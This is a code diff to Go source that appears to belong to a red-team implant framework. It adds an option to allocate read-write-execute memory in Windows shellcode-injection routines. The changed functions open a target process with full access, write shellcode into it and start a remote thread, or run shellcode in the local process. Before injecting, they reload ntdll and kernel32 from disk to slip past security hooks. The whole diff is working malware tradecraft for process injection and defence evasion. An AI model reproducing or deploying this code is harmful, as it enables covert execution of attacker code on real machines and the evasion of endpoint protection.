@@ -121,9 +121,13 @@ func createRemoteThread(process syscall.Handle, sa *syscall.SecurityAttributes, 
 	return syscall.Handle(r1), threadID, nil
 }
 
-func sysAlloc(size int) (uintptr, error) {
+func sysAlloc(size int, rwxPages bool) (uintptr, error) {
+	perms := syscall.PAGE_EXECUTE_READWRITE
+	if !rwxPages {
+		perms = syscall.PAGE_READWRITE
+	}
 	n := uintptr(size)
-	addr, _, err := procVirtualAlloc.Call(0, n, MEM_RESERVE|MEM_COMMIT, syscall.PAGE_READWRITE)
+	addr, _, err := procVirtualAlloc.Call(0, n, MEM_RESERVE|MEM_COMMIT, uintptr(perms))
 	if addr == 0 {
 		return 0, err
 	}
@@ -212,14 +216,21 @@ func writeGoodBytes(b []byte, pn string, virtualoffset uint32, secname string, v
 }
 
 // injectTask - Injects shellcode into a process handle
-func injectTask(processHandle syscall.Handle, data []byte) error {
-
+func injectTask(processHandle syscall.Handle, data []byte, rwxPages bool) error {
+	var (
+		err        error
+		remoteAddr uintptr
+	)
 	dataSize := len(data)
 	// Remotely allocate memory in the target process
 	// {{if .Debug}}
 	log.Println("allocating remote process memory ...")
 	// {{end}}
-	remoteAddr, err := virtualAllocEx(processHandle, 0, uint32(dataSize), MEM_COMMIT|MEM_RESERVE, syscall.PAGE_READWRITE)
+	if rwxPages {
+		remoteAddr, err = virtualAllocEx(processHandle, 0, uint32(dataSize), MEM_COMMIT|MEM_RESERVE, syscall.PAGE_EXECUTE_READWRITE)
+	} else {
+		remoteAddr, err = virtualAllocEx(processHandle, 0, uint32(dataSize), MEM_COMMIT|MEM_RESERVE, syscall.PAGE_READWRITE)
+	}
 	// {{if .Debug}}
 	log.Printf("virtualallocex returned: remoteAddr = %v, err = %v", remoteAddr, err)
 	// {{end}}
@@ -241,16 +252,17 @@ func injectTask(processHandle syscall.Handle, data []byte) error {
 		// {{end}}
 		return err
 	}
-	var oldProtect int
-	// Set proper page permissions
-	err = virtualProtectEx(processHandle, remoteAddr, uint(dataSize), syscall.PAGE_EXECUTE_READ, unsafe.Pointer(&oldProtect))
-	if err != nil {
-		//{{if .Debug}}
-		log.Println("VirtualProtectEx failed:", err)
-		//{{end}}
-		return err
+	if !rwxPages {
+		var oldProtect int
+		// Set proper page permissions
+		err = virtualProtectEx(processHandle, remoteAddr, uint(dataSize), syscall.PAGE_EXECUTE_READ, unsafe.Pointer(&oldProtect))
+		if err != nil {
+			//{{if .Debug}}
+			log.Println("VirtualProtectEx failed:", err)
+			//{{end}}
+			return err
+		}
 	}
-
 	// Create the remote thread to where we wrote the shellcode
 	// {{if .Debug}}
 	log.Println("successfully injected data, starting remote thread ....")
@@ -270,48 +282,62 @@ func injectTask(processHandle syscall.Handle, data []byte) error {
 }
 
 // RermoteTask - Injects Task into a processID using remote threads
-func RemoteTask(processID int, data []byte) error {
+func RemoteTask(processID int, data []byte, rwxPages bool) error {
 	err := RefreshPE(ntdllPath)
 	if err != nil {
+		//{{if .Debug}}
+		log.Printf("RefreshPE on ntdll failed: %v\n", err)
+		//{{end}}
 		return err
 	}
 	err = RefreshPE(kernel32dllPath)
 	if err != nil {
+		//{{if .Debug}}
+		log.Printf("RefreshPE on kernel32 failed: %v\n", err)
+		//{{end}}
 		return err
 	}
 	processHandle, err := syscall.OpenProcess(PROCESS_ALL_ACCESS, false, uint32(processID))
 	if processHandle == 0 {
 		return err
 	}
-	err = injectTask(processHandle, data)
+	err = injectTask(processHandle, data, rwxPages)
 	if err != nil {
 		return err
 	}
 	return nil
 }
 
-func LocalTask(data []byte) error {
+func LocalTask(data []byte, rwxPages bool) error {
 	err := RefreshPE(ntdllPath)
 	if err != nil {
+		//{{if .Debug}}
+		log.Printf("RefreshPE on ntdll failed: %v\n", err)
+		//{{end}}
 		return err
 	}
 	err = RefreshPE(kernel32dllPath)
 	if err != nil {
+		//{{if .Debug}}
+		log.Printf("RefreshPE on kernel32 failed: %v\n", err)
+		//{{end}}
 		return err
 	}
 	size := len(data)
-	addr, _ := sysAlloc(size)
+	addr, _ := sysAlloc(size, rwxPages)
 	buf := (*[9999999]byte)(unsafe.Pointer(addr))
 	for index := 0; index < size; index++ {
 		buf[index] = data[index]
 	}
-	var oldProtect int
-	err = virtualProtect(addr, uint(size), syscall.PAGE_EXECUTE_READ, unsafe.Pointer(&oldProtect))
-	if err != nil {
-		//{{if .Debug}}
-		log.Println("VirtualProtect failed:", err)
-		//{{end}}
-		return err
+	if !rwxPages {
+		var oldProtect int
+		err = virtualProtect(addr, uint(size), syscall.PAGE_EXECUTE_READ, unsafe.Pointer(&oldProtect))
+		if err != nil {
+			//{{if .Debug}}
+			log.Println("VirtualProtect failed:", err)
+			//{{end}}
+			return err
+		}
 	}
 	// {{if .Debug}}
 	log.Printf("creating local thread with start address: 0x%08x", addr)
